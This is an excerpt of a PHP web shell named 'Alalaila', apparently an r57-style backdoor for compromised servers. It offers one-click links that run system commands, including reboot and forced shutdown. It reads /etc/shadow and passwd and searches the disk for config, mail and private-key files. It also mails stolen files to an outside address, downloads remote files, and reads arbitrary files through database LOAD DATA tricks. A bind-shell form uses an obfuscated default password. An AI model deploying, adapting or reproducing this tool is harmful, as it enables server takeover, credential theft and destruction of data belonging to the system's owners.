...
$head = '
<html><head><title>Alalaila</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<STYLE>
tr {
 ...
 function connect()
  ...
  switch($this->db)
   ...
   case 'SQLite':
    ...
    $this->connection = @sqlite_open($this->base,'0666');
    if(is_resource($this->connection)) return 1;
   break;
     }
    return 0;   
...
if(isset($_GET['10']))
 {$_POST['cmd'] = 'net user';}
if(isset($_GET['11']))
 {$_POST['cmd'] = 'net accounts';}
if(isset($_GET['12']))
 {$_POST['cmd'] = 'openfiles /query /v';}
if(isset($_GET['13']))
 {$_POST['cmd'] = 'ipconfig /all';}
if(isset($_GET['14']))
 {$_POST['cmd'] = 'netstat -ano';}
if(isset($_GET['15']))
 {$_POST['cmd'] = 'getmac';}
if(isset($_GET['16']))
 {$_POST['cmd'] = 'arp -a';}
...
if(isset($_GET['18']))
 {$_POST['cmd'] = 'ver';}
if(isset($_GET['19']))
 {$_POST['cmd'] = 'shutdown -r';}
if(isset($_GET['20']))
 {$_POST['cmd'] = 'shutdown -f -s';}
if(isset($_GET['21']))
...
if(isset($_GET['37']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/issue';}
if(isset($_GET['38']))
 {$_POST['cmd'] = 'lsattr -va';}
if(isset($_GET['39']))
 {$_POST['cmd'] = 'w';}
...
if(isset($_GET['51']))
 {$_POST['cmd'] = 'arp -an';}
if(isset($_GET['52']))
 {$_POST['cmd'] = 'smartctl -a /dev/hda';}
if(isset($_GET['53']))
 {$_POST['cmd'] = 'hdparm -i /dev/hda';}
if(isset($_GET['54']))
...
'locate config* files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'locate config >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt',
...
'locate .fetchmailrc files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'locate ".fetchmailrc" >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt',
...
'find psybnc.conf files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'find / -type f -name psybnc.conf >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt',
'find my.conf files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'find / -type f -name my.conf >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt',
...
'find .fetchmailrc files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'find / -type f -name .fetchmailrc  >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt',
...
'find *priv* files >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt'=>'find / -type f -name "*priv*" >> '.$tempdir.'grep.txt;cat '.$tempdir.'grep.txt',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
...
if(!isset($_COOKIE['uname'])) { 
	$uname = getenv('OS');
	if(empty($uname) && @function_exists('posix_uname')){ $uname=implode('',@posix_uname());} 
	elseif(empty($uname)){ $uname = @php_uname(); } 
	elseif(empty($uname)){ $uname = ex('uname -a');}
	elseif(empty($uname)){ $uname ="-"; } 
	setcookie('uname',$uname);
}else{
	$uname = $_COOKIE['uname'];
}

if(!isset($_COOKIE['OSTYPE'])) { 
	$OSTYPE=substr(@php_uname(),0,6);
	if(empty($OSTYPE) && @function_exists('posix_uname')){$OSTYPE = @posix_uname();$OSTYPE = $OSTYPE['sysname'];}
	if(empty($OSTYPE)){$OSTYPE=ex('echo $OSTYPE');}
	if(empty($OSTYPE)){$OSTYPE='-';}
	setcookie('OSTYPE',$OSTYPE);
}else{
	$OSTYPE = $_COOKIE['OSTYPE'];
}

if(!isset($_COOKIE['unix'])) { 
	$unix = 1;
	if(strlen($dir)>1 && $dir[1]==":") $unix=0;
	if(empty($dir) && (@eregi("^win",$uname)||@eregi("win",$SERVER_SOFTWARE))) { $unix = 0; };
	setcookie('unix',$unix);
}else{
	$unix = $_COOKIE['unix'];
}

if(!isset($_COOKIE['safe_mode'])) { 
	if(strpos(ex("echo abcdef"),"def")!=3) { $safe_mode = 1; }else{$safe_mode = 0;}
	setcookie('safe_mode',$safe_mode);
}else{
	$safe_mode = $_COOKIE['safe_mode'];
}
...
if(strlen($path) > 3) { return $path; } else { return false; }
}
function locate($pr)
{
$path = '';
...
if($unix)
{
 if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }
 elseif($safe_mode) { $sysctl = '-'; setcookie('sysctl',$sysctl);}
 else  
  {
...
if(!isset($_COOKIE['user_id'])){
	if(!$safe_mode && $unix){ $user_id = ex('id'); setcookie('user_id',$user_id); } 
	...
	{ $euserinfo  = @posix_getpwuid(@posix_geteuid());$egroupinfo = @posix_getgrgid(@posix_getegid()); 
	  $user_id='uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )';
	}
	elseif(@function_exists('get_current_user') && @function_exists('getmyuid') && @function_exists('getmygid'))
	{ $user_id="user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid();}
	elseif(@function_exists('get_current_user')){$user_id=@get_current_user();}
	else{ $user_id = @getenv("USERNAME"); }
...
if(!isset($_COOKIE['downloader'])) {
	...
	if(empty($downloader)) {$downloader=$select_downloaders='-';}
...
ws(2).'<b>'.ws(2).'<center>Alalaila<br>v.'.$version.'</b><br><br><br></center></font>'.
...
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?26' title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?27' title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb;
if(!$unix && !$safe_mode) {
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?19' title=\"Dander! System is reboot!\"><b>reboot</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?20' title=\"Danger! System is shutdown!\"><b>shutdown</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?5' title=\"View system info\"><b>systeminfo</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?6' title=\"View psinfo\"><b>psinfo</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?17' title=\"View vol\"><b>vol</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?18' title=\"View version\"><b>ver</b></a> ".$rb;
echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?8' title=\"View process list\"><b>tasklist</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?7' title=\"View process list\"><b>pslist</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?9' title=\"View started service\"><b>net start</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?10' title=\"View users\"><b>net user</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?11' title=\"View users\"><b>net accounts</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?12' title=\"View openfiles\"><b>openfiles</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?13' title=\"View ipconfig\"><b>ipconfig</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?14' title=\"View netstat\"><b>netstat</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?15' title=\"View all mac\"><b>getmac</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?16' title=\"View all mac\"><b>arp</b></a> ".$rb;
}else{
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?21' title=\"View syslog.conf\"><b>syslog</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?22' title=\"View resolv\"><b>resolv</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?23' title=\"View hosts\"><b>hosts</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?24' title=\"View shadow\"><b>shadow</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?25' title=\"".$lang[$language.'_text95']."\"><b>passwd</b></a> ".$rb; 
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?37' title=\"View realise2\"><b>realise2</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?54' title=\"View fstab\"><b>fstab</b></a> ".$rb;
}

if($unix && !$safe_mode) 
{ 
 echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?28' title=\"View procinfo\"><b>procinfo</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?29' title=\"View proc version\"><b>version</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?30' title=\"View mem free\"><b>free</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?31' title=\"View dmesg\"><b>dmesg</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?32' title=\"View vmstat\"><b>vmstat</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?33' title=\"View lspci\"><b>lspci</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?34' title=\"View lsdev\"><b>lsdev</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?35' title=\"View interrupts\"><b>interrupts</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?36' title=\"View realise1\"><b>realise1</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?38' title=\"View lsattr -va\"><b>lsattr</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?49' title=\"View ifconfig\"><b>ifconfig</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?50' title=\"View netstat -a\"><b>netstat</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?51' title=\"View arp\"><b>arp</b></a> ".$rb;

 echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?39' title=\"View w\"><b>w</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?40' title=\"View who\"><b>who</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?41' title=\"View users\"><b>users</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?42' title=\"View finger\"><b>finger</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?43' title=\"View last -n 10\"><b>last</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?44' title=\"View uptime\"><b>uptime</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?45' title=\"View ps -aux\"><b>ps aux</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?46' title=\"View lsof\"><b>lsof</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?47' title=\"View service\"><b>service</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?48' title=\"View chkconfig\"><b>chkconfig</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?52' title=\"View smartctl\"><b>smartctl</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?53' title=\"View hdparm\"><b>hdparm</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?55' title=\"View fdisk -l\"><b>fdisk</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?56' title=\"View df -h\"><b>df -h</b></a> ".$rb;
}
...
echo ws(3).$sysctl."<br>";
echo ws(3).$OSTYPE."<br>";
echo ws(3).$SERVER_SOFTWARE."<br>";
echo ws(3).$user_id."<br>";
echo ws(3).$dir.ws(3).'( '.perms(@fileperms($dir)).' )';
echo "</b></font>";
}
else
{
...
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {  
  ...
  if(!empty($_POST['cmd'])) 
  {
    ...
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from Alalaila'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'jora@mail.com'; }
...
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 ...
 break;
 case 'lwp-mirror':
 $_POST['cmd'] = which('lwp-mirror')." \"".$_POST['rem_file']."\" \"".$_POST['loc_file']."\"";
 break;
 }
}
 ...
 break;
  ...
  if($db)
   ...
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     @mysql_query("DROP TABLE IF EXISTS temp_abd_table");
     @mysql_query("CREATE TABLE `temp_abc_table` ( `file` LONGBLOB NOT NULL )");
     @mysql_query("LOAD DATA LOCAL INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_abc_table");
     $r = @mysql_query("SELECT * FROM temp_abc_table");
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0])."\r\n"; }
     @mysql_query("DROP TABLE IF EXISTS temp_abc_table");
    }
  ...
  $m->query("DROP TABLE IF EXISTS temp_abc_table");
  $m->query("CREATE TABLE temp_abc_table ( 'file' LONGBLOB NOT NULL )");
  $m->query("LOAD DATA LOCAL INFILE \"".$_POST['test19_file']."\" INTO TABLE temp_abc_table");
  $r = $m->query("SELECT * FROM temp_abc_table");
...
function div($id)
 ...
 $divid=array('id5','id6','id7','id8','id9','id10','id11','id16','id24','id25','id26','id27','id28','id29','id30','id31','id32','id33','id34','id35','id36','id37','id38','id39');
...
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("jora@mail.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("file from alalaila"))));
...
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',10,chr('114').chr('53').chr('55')));
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>Generation time: ".round(getmicrotime()-starttime,4)." </b></font></div></td></tr></table>";
echo '</body></html>';
?>